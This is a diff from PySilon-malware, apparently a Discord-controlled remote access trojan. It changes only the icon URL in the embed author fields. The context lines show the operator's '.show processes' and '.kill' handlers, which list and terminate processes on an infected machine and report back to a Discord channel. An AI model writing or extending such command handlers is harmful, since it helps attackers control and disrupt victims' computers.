@@ -20,7 +20,7 @@ elif str(reaction) == '💀' and reaction.message.content[:39] == '```Do you rea
     except Exception as e:
         #.log Error occurred while trying to parse the process name 
         embed = discord.Embed(title="📛 Error",description=f'```Error while parsing the process name...\n' + str(e) + '```', colour=discord.Colour.red())
-        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await reaction.message.channel.send(embed=embed)
         #.log Sent message about the error with more details 
         await reaction_msg.add_reaction('🔴')
@@ -36,14 +36,14 @@ elif str(reaction) == '💀' and reaction.message.content[:39] == '```Do you rea
         for i in killed_processes:
             processes_killed = processes_killed + '\n• ' + str(i)
         embed = discord.Embed(title="🟢 Success",description=f'```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed + '```', colour=discord.Colour.green())
-        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await reaction.message.channel.send(embed=embed)
         #.log Sent message about killed processes 
         await reaction_msg.add_reaction('🔴')
     except Exception as e:
         #.log Error occurred while trying to kill processes 
         embed = discord.Embed(title="📛 Error",description='```Error while killing processes...\n' + str(e) + '```', colour=discord.Colour.red())
-        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await reaction.message.channel.send(embed=embed)
         #.log Sent message about the error with more details 
         await reaction_msg.add_reaction('🔴')
@@ -62,7 +62,7 @@ elif message.content[:5] == '.show':
     if message.content.strip() == '.show':
         #.log Author issued empty ".show" 
         embed = discord.Embed(title="📛 Error",description='```Syntax: .show <what-to-show>```', colour=discord.Colour.red())
-        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
         #.log Sent message with usage of ".show" 
     else:
@@ -116,7 +116,7 @@ elif message.content[:5] == '.kill':
         except:
             #.log Author provided invalid process ID 
             embed = discord.Embed(title="📛 Error",description=f'```Please provide a valid number of process from  .show processes```', colour=discord.Colour.red())
-            embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             reaction_msg = await message.channel.send(embed=embed)
             #.log Sent message about invalid process ID 
             await reaction_msg.add_reaction('🔴')
@@ -135,14 +135,14 @@ elif message.content[:5] == '.kill':
         else:
             #.log Couldn\'t find any process with provided process ID 
             embed = discord.Embed(title="📛 Error",description="```There isn't any process with that index. Range of process indexes is 1-" + str(len(processes_list)-1) + '```', colour=discord.Colour.red())
-            embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             reaction_msg = await message.channel.send(embed=embed)
             #.log Sent message about wrong process ID 
             await reaction_msg.add_reaction('🔴')
     else:
         #.log Processes list is not generated 
         embed = discord.Embed(title="📛 Error",description='```You need to generate the processes list to use this feature\n.show processes```', colour=discord.Colour.red())
-        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await message.channel.send()
         #.log Sent message about missing process list 
         await reaction_msg.add_reaction('🔴')
